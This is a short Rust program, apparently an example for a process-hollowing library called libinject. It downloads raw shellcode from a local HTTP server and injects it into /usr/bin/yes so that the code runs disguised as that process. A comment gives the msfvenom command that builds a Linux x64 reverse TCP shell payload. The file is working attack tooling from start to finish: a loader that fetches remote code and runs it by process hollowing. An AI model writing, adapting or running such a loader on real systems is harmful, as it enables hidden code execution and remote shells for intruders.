#![allow(unused_imports, unused_variables)]
extern crate libinject;
use libinject::hollow;
use std::env::current_dir;
use std::fs;

pub fn get_binary_filesystem(path: &str) -> Vec<u8> {
    fs::read(path).expect("Faild to open file")
}

pub fn get_binary_http(url: &str) -> Vec<u8> {
    let response = reqwest::blocking::get(url).expect("Failed to download file");
    response.bytes().unwrap().to_vec()
}

fn main() {
    let path = current_dir().unwrap();
    let cwd = path.display();

    // Shellcode:
    // msfvenom --payload 'linux/x64/shell_reverse_tcp' LHOST=127.0.0.1 LPORT=1234 --format 'raw' --platform 'linux' --arch 'x64' --out shellcode.bin
    // let shellcode_location = format!("{}/shellcode.bin", cwd);
    // let shellcode_bytes = get_binary_filesystem(&shellcode_location);
    let shellcode_location = "http://127.0.0.1:8081/shellcode.bin";
    let shellcode_bytes = get_binary_http(shellcode_location);

    let target = "/usr/bin/yes";

    match hollow(target, "", &shellcode_bytes) {
        Ok(res) => res,
        Err(error) => panic!("An error occured: {error:?}"),
    };
}
